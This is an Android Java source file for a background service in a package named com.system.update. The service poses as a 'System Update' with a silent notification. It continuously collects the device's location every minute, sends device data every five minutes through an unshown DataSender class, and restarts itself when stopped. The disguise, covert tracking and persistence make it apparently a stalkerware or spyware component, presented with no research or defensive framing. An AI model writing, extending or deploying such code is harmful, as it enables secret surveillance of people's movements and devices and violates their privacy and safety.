package com.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

public class BackgroundService extends Service {
    
    private static final String CHANNEL_ID = "system_channel";
    private static final int NOTIFICATION_ID = 999;
    
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private DataSender dataSender;
    private Handler handler;
    private Runnable dataRunnable;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        dataSender = new DataSender(this);
        handler = new Handler(Looper.getMainLooper());
        
        createNotificationChannel();
        
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                
                for (Location location : locationResult.getLocations()) {
                    dataSender.sendLocationData(location);
                }
            }
        };
        
        // Enviar datos del dispositivo cada 5 minutos
        dataRunnable = new Runnable() {
            @Override
            public void run() {
                dataSender.sendDeviceData();
                handler.postDelayed(this, 300000); // 5 minutos
            }
        };
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, createNotification());
        startLocationUpdates();
        startDataCollection();
        return START_STICKY;
    }
    
    private void startLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 60000) // 1 minuto
                .setMinUpdateIntervalMillis(30000) // mínimo 30 segundos
                .build();
        
        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }
    
    private void startDataCollection() {
        handler.post(dataRunnable);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Services",
                    NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Background services running")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setOngoing(true)
                .setSilent(true)
                .build();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (fusedLocationClient != null && locationCallback != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
        }
        if (handler != null && dataRunnable != null) {
            handler.removeCallbacks(dataRunnable);
        }
        
        // Reiniciar el servicio
        Intent restartIntent = new Intent(this, BackgroundService.class);
        startService(restartIntent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
